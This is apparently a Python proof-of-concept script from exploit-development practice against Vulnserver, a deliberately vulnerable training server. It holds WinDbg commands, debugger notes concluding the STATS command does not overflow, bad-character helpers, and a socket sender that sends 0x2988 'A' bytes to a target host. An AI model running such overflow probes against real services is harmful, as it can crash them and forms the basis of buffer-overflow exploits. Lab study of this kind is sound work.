#!/usr/bin/env python3
import os, sys, re, socket, binascii
from struct import pack, unpack
from IPython import embed

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv; g'
### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c ' bp 00401C15; g'

NOTES=r"""
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./poc.py 192.168.56.100:9999
Welcome to Vulnerable Server! Enter HELP for help.

Valid Commands:
HELP
STATS [stat_value]      ;not_exploitable
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT

For STATS, destination buffer is on the heap.  The opcode has a call to strncpy.
0:002> dds esp L0x3
00d0fa08  00b02988  dest (came from eax)
00d0fa0c  00b04f70  src
00d0fa10  00000078  sz

To figure out the address was on the heap, I used:
!address eax

After figuring out offset from beginning of heap to address in eax, I found that the offset to the beginning of the heap is:
0:003> ? eax - 006d0000
Evaluate expression: 10632 = 00002988   <---

This was on a successive start of the application, so heap address changed.  However, the offset is still the same.

Regardless, the strncpy call included a specific size, and that's precisely the maximum that was read in:
0:002> dd eax
006d2a08  54415453 41412053 41414141 41414141
006d2a18  41414141 41414141 41414141 41414141
006d2a28  41414141 41414141 41414141 41414141
006d2a38  41414141 41414141 41414141 41414141
006d2a48  41414141 41414141 41414141 41414141
006d2a58  41414141 41414141 41414141 41414141
006d2a68  41414141 41414141 41414141 41414141
006d2a78  41414141 41414141 907db0a1 000024b3

No overflow.



"""

def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')

# def unpacklatin(fmt, inp):
#         return unpack(fmt, inp.encode('latin-1'))[0]

# def uniesc_to_bytestr(instring):
#     r""" '\\x58\\x59\\x5a\\xa0' -> 'XYZ\xa0' 
#         hexstrings in from cli, ex., argparse   """
#     return bytes(instring, 'utf-8').decode("unicode_escape")

# def bytestr_to_long(inbstr):
#     r""" 'XYZ\xa0' -> 2690275672 """
#     return unpack("I",bytes(inbstr,'latin-1'))[0]

# def long_to_bytestr(inlong):
#     r""" 2690275672 -> 'XYZ\xa0' """
#     return pack("<L", inlong).decode('latin-1')

# def octalstring_to_bytestr_pad(inoct):
#     r""" "0x200" -> '\x00\x02\x00\x00' (le) 
#         for the --va + --addbase scenario 
#         pad with \x00 to dword size bytes """
#     return pack("<L", (int(inoct,16))).decode('latin-1')

# def octalstring_to_bytestr_nopad(inoct):
#     r""" "0x200" -> '\x00\x02' (le) 
#         for the --va only scenario 
#         no padding with \x00 to dword size bytes """
#     octstr = inoct[2:]
#     if len(octstr) % 2 == 1:
#         octstr = f"0{octstr}"
#     return ''.join([chr(int(octstr[x:x+2],16)) for x in range(0,len(octstr),2)][::-1])

badchars = "\x00\x0a\x0d\x20\x3b"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def sender(ip, port, buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(buf.encode('latin-1'))
    return sock

def help(ip,port):
    buf = "HELP" 
    sock = sender(ip, port, buf)
    # print(sock.recv(4096))
    print(sock.recv(4096).decode('latin-1'))
    print(sock.recv(4096).decode('latin-1'))
    sock.close()

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    # help(ip,port)

    oflow_sz = 0x2988

    buf = "STATS "
    buf += "\x41" * oflow_sz 
    sock = sender(ip, port, buf)


if __name__=="__main__":
    main()

